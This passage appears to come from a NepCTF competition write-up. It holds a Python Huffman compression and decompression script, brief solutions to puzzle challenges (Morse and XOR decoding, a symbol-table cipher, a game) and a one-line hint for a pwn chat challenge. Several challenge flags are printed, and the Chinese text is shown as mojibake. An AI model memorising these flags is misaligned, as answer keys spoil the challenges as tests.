class=\"token operator\">=</span> freq</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        self<span class=\"token punctuation\">.</span>left <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        self<span class=\"token punctuation\">.</span>right <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__lt__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> other<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">return</span> self<span class=\"token punctuation\">.</span>freq <span class=\"token operator\">&lt;</span> other<span class=\"token punctuation\">.</span>freq</pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">build_huffman_tree</span><span class=\"token punctuation\">(</span>frequencies<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    heap <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>HuffmanNode<span class=\"token punctuation\">(</span>char<span class=\"token punctuation\">,</span> freq<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> char<span class=\"token punctuation\">,</span> freq <span class=\"token keyword\">in</span> frequencies<span class=\"token punctuation\">.</span>items<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    heapq<span class=\"token punctuation\">.</span>heapify<span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        left <span class=\"token operator\">=</span> heapq<span class=\"token punctuation\">.</span>heappop<span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        right <span class=\"token operator\">=</span> heapq<span class=\"token punctuation\">.</span>heappop<span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        merged <span class=\"token operator\">=</span> HuffmanNode<span class=\"token punctuation\">(</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> left<span class=\"token punctuation\">.</span>freq <span class=\"token operator\">+</span> right<span class=\"token punctuation\">.</span>freq<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        merged<span class=\"token punctuation\">.</span>left <span class=\"token operator\">=</span> left</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        merged<span class=\"token punctuation\">.</span>right <span class=\"token operator\">=</span> right</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        heapq<span class=\"token punctuation\">.</span>heappush<span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">,</span> merged<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">return</span> heap<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">build_huffman_codes</span><span class=\"token punctuation\">(</span>node<span class=\"token punctuation\">,</span> current_code<span class=\"token punctuation\">,</span> huffman_codes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">if</span> node <span class=\"token keyword\">is</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">if</span> node<span class=\"token punctuation\">.</span>char <span class=\"token keyword\">is</span> <span class=\"token keyword\">not</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        huffman_codes<span class=\"token punctuation\">[</span>node<span class=\"token punctuation\">.</span>char<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> current_code</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    build_huffman_codes<span class=\"token punctuation\">(</span>node<span class=\"token punctuation\">.</span>left<span class=\"token punctuation\">,</span> current_code <span class=\"token operator\">+</span> <span class=\"token string\">'0'</span><span class=\"token punctuation\">,</span> huffman_codes<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    build_huffman_codes<span class=\"token punctuation\">(</span>node<span class=\"token punctuation\">.</span>right<span class=\"token punctuation\">,</span> current_code <span class=\"token operator\">+</span> <span class=\"token string\">'1'</span><span class=\"token punctuation\">,</span> huffman_codes<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">compress</span><span class=\"token punctuation\">(</span>input_file<span class=\"token punctuation\">,</span> output_file<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>input_file<span class=\"token punctuation\">,</span> <span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        data <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    frequencies <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token keyword\">for</span> byte <span class=\"token keyword\">in</span> data<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token keyword\">if</span> byte <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> frequencies<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>            frequencies<span class=\"token punctuation\">[</span>byte<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        frequencies<span class=\"token punctuation\">[</span>byte<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    root <span class=\"token operator\">=</span> build_huffman_tree<span class=\"token punctuation\">(</span>frequencies<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    huffman_codes <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    build_huffman_codes<span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">,</span> huffman_codes<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    compressed_data <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token keyword\">for</span> byte <span class=\"token keyword\">in</span> data<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        compressed_data <span class=\"token operator\">+=</span> huffman_codes<span class=\"token punctuation\">[</span>byte<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    padding <span class=\"token operator\">=</span> <span class=\"token number\">8</span> <span class=\"token operator\">-</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>compressed_data<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    compressed_data <span class=\"token operator\">+=</span> <span class=\"token string\">'0'</span> <span class=\"token operator\">*</span> padding</pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>output_file<span class=\"token punctuation\">,</span> <span class=\"token string\">'wb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>        <span class=\"token comment\"># Write frequency information</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>        f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>frequencies<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>        <span class=\"token keyword\">for</span> byte<span class=\"token punctuation\">,</span> freq <span class=\"token keyword\">in</span> frequencies<span class=\"token punctuation\">.</span>items<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>            f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>byte<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>freq <span class=\"token operator\">>></span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>freq <span class=\"token operator\">>></span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>freq <span class=\"token operator\">>></span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">,</span> freq <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>        <span class=\"token comment\"># Write compressed data</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>compressed_data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>            byte <span class=\"token operator\">=</span> compressed_data<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">:</span>i<span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>            f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>byte<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre></pre></td></tr><tr><td data-num=\"72\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">build_huffman_tree_from_bytes</span><span class=\"token punctuation\">(</span>frequencies<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>    heap <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>HuffmanNode<span class=\"token punctuation\">(</span>byte<span class=\"token punctuation\">,</span> freq<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> byte<span class=\"token punctuation\">,</span> freq <span class=\"token keyword\">in</span> frequencies<span class=\"token punctuation\">.</span>items<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>    heapq<span class=\"token punctuation\">.</span>heapify<span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>        left <span class=\"token operator\">=</span> heapq<span class=\"token punctuation\">.</span>heappop<span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>        right <span class=\"token operator\">=</span> heapq<span class=\"token punctuation\">.</span>heappop<span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>        merged <span class=\"token operator\">=</span> HuffmanNode<span class=\"token punctuation\">(</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> left<span class=\"token punctuation\">.</span>freq <span class=\"token operator\">+</span> right<span class=\"token punctuation\">.</span>freq<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>        merged<span class=\"token punctuation\">.</span>left <span class=\"token operator\">=</span> left</pre></td></tr><tr><td data-num=\"81\"></td><td><pre>        merged<span class=\"token punctuation\">.</span>right <span class=\"token operator\">=</span> right</pre></td></tr><tr><td data-num=\"82\"></td><td><pre>        heapq<span class=\"token punctuation\">.</span>heappush<span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">,</span> merged<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>    <span class=\"token keyword\">return</span> heap<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre></pre></td></tr><tr><td data-num=\"86\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">decompress</span><span class=\"token punctuation\">(</span>input_file<span class=\"token punctuation\">,</span> output_file<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>input_file<span class=\"token punctuation\">,</span> <span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>        frequencies_count <span class=\"token operator\">=</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>        frequencies <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>        <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>frequencies_count<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>            byte <span class=\"token operator\">=</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>            freq <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>            frequencies<span class=\"token punctuation\">[</span>byte<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> freq</pre></td></tr><tr><td data-num=\"95\"></td><td><pre></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>        root <span class=\"token operator\">=</span> build_huffman_tree_from_bytes<span class=\"token punctuation\">(</span>frequencies<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>        huffman_codes <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>        build_huffman_codes<span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">,</span> huffman_codes<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>        reverse_huffman_codes <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>v<span class=\"token punctuation\">:</span> k <span class=\"token keyword\">for</span> k<span class=\"token punctuation\">,</span> v <span class=\"token keyword\">in</span> huffman_codes<span class=\"token punctuation\">.</span>items<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>        decompressed_data <span class=\"token operator\">=</span> <span class=\"token builtin\">bytearray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>        code <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>        <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>            byte <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>byte<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>                <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>            byte <span class=\"token operator\">=</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>byte<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>            <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>                <span class=\"token keyword\">if</span> byte <span class=\"token operator\">&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token operator\">&lt;&lt;</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>                    code <span class=\"token operator\">+=</span> <span class=\"token string\">'1'</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>                <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>                    code <span class=\"token operator\">+=</span> <span class=\"token string\">'0'</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>                <span class=\"token keyword\">if</span> code <span class=\"token keyword\">in</span> reverse_huffman_codes<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>                    decompressed_data<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>reverse_huffman_codes<span class=\"token punctuation\">[</span>code<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>                    code <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>output_file<span class=\"token punctuation\">,</span> <span class=\"token string\">'wb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>        f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>decompressed_data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre></pre></td></tr><tr><td data-num=\"123\"></td><td><pre></pre></td></tr><tr><td data-num=\"124\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>    <span class=\"token comment\"># input_file = 'input.txt'</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>    compressed_file <span class=\"token operator\">=</span> <span class=\"token string\">'compressed.bin'</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>    decompressed_file <span class=\"token operator\">=</span> <span class=\"token string\">'decompressed.txt'</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>    <span class=\"token comment\"># ÂéãÁº©Êñá‰ª∂</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>    <span class=\"token comment\"># compress(input_file, compressed_file)</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>    <span class=\"token comment\"># Ëß£ÂéãÁº©Êñá‰ª∂</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>    decompress<span class=\"token punctuation\">(</span>compressed_file<span class=\"token punctuation\">,</span> decompressed_file<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/img/wp/2.png\" alt=\"\"></p>\n<h4 id=\"3connectedfive\"><a class=\"markdownIt-Anchor\" href=\"#3connectedfive\">#</a> 3.ConnectedFive</h4>\n<p>‰∫îÂ≠êËøûÁè†ÔºåÂà∞ 42 Âç≥ÂèØÊãø flag</p>\n<p><img data-src=\"/img/wp/3.png\" alt=\"\"></p>\n<h4 id=\"4checkin\"><a class=\"markdownIt-Anchor\" href=\"#4checkin\">#</a> 4.CheckIn</h4>\n<blockquote>\n<p>NepCTF H4ve_Fun_1N_This_Game}</p>\n</blockquote>\n<h4 id=\"5ÈôåÁîüÁöÑËØ≠Ë®Ä\"><a class=\"markdownIt-Anchor\" href=\"#5ÈôåÁîüÁöÑËØ≠Ë®Ä\">#</a> 5. ÈôåÁîüÁöÑËØ≠Ë®Ä</h4>\n<p><img data-src=\"/img/wp/1.jpg\" alt=\"1\"></p>\n<p><img data-src=\"/img/wp/1691849788716.jpg\" alt=\"1691849788716\"></p>\n<p>ÂØπÁÖßÁ†ÅË°®ÔºöNEPNEP_A_BELIEVING_HEART_IS_YOUR_MAGIC</p>\n<p>NepCTF NEPNEP_A_BELIEVING_HEART_IS_YOUR_MAGIC}</p>\n<h4 id=\"6Â∞èÂèÆÂºπÈí¢Áê¥\"><a class=\"markdownIt-Anchor\" href=\"#6Â∞èÂèÆÂºπÈí¢Áê¥\">#</a> 6. Â∞èÂèÆÂºπÈí¢Áê¥</h4>\n<p>Èü≥È¢ëÊúâ‰ø°ÊÅØ</p>\n<blockquote>\n<p>0x370a05303c290e045005031c2b1858473a5f052117032c39230f005d1e17</p>\n</blockquote>\n<blockquote>\n<p>-.‚Äì/‚Äî/‚Ä¶-/‚Ä¶/‚Ä¶/‚Äî/‚Ä¶-/.-‚Ä¶/-‚Ä¶/‚Ä¶-/‚Ä¶/./-/‚Ä¶/‚Ä¶/‚Ä¶/-/‚Äî/-‚Ä¶-/‚Äî/.-./‚Ä¶/‚Äî/‚Äì/./-/‚Ä¶/‚Ä¶/-./‚Äì.</p>\n</blockquote>\n<p>Êë©ÊñØËΩ¨Âåñ</p>\n<blockquote>\n<p>YOU SHOULD USE THIS TO XOR SOME THING</p>\n</blockquote>\n<p>ÂºÇÊàñÂ≠óÁ¨¶‰∏≤Ôºà16 ËøõÂà∂ËΩ¨ÂåñÔºâ</p>\n<blockquote>\n<p>0x6e 0x45 0x50 0x63 0x74 0x66 0x5b 0x48 0x14 0x50 0x50 0x59 0x7f 0x50 0x11 0x14 0x6e 0x10 0x5d<br>\n0x6e 0x45 0x50 0x63 0x74 0x66 0x5b 0x48 0x14 0x50 0x50</p>\n</blockquote>\n<p>‰øÆÊîπ‰∏Ä‰∏ãÔºöÊâæ‰∏ãËßÑÂæãÂéª‰øÆÊîπ‰∏Ä‰∏ã</p>\n<blockquote>\n<p>0x4e 0x65 0x70 0x43 0x54 0x46 0x7b 0x68 0x34 0x70 0x70 0x79 0x5f 0x70 0x31 0x34 0x4e 0x30 0x7d</p>\n</blockquote>\n<blockquote>\n<p>NepCTF h4ppy_p14N0}</p>\n</blockquote>\n<h4 id=\"7ÈóÆÂç∑\"><a class=\"markdownIt-Anchor\" href=\"#7ÈóÆÂç∑\">#</a> 7. ÈóÆÂç∑</h4>\n<p><img data-src=\"/img/wp/image-20230813202714138.png\" alt=\"image-20230813202714138\"></p>\n<h2 id=\"2-pwn\"><a class=\"markdownIt-Anchor\" href=\"#2-pwn\">#</a> 2. pwn:</h2>\n<h4 id=\"hrp-chat-4\"><a class=\"markdownIt-Anchor\" href=\"#hrp-chat-4\">#</a> HRP-CHAT-4</h4>\n<p><img data-src=\"/img/wp/image-20230813203342637.png\" alt=\"image-20230813203342637\"></p>\n<p><img data-src=\"/img/wp/image-20230813203738235.png\" alt=\"image-20230813204233847\"></p>\n<p>‰∏ÄÁõ¥‰π∞Áõ¥Âà∞Á†¥ÂùèÂ≠êÁ∫øÁ®ãÔºåÁÑ∂ÂêéÊâßË°å   Safe_Mode_Key</p>\n<p>ÂæóÂà∞ flagÔºöThis is your key!</p>\n<blockquote>\n<p>Nepctf  IAMFOUR_b924541f-bd73-16f1-418d-932d681eb691</p>\n</blockquote>\n<h4 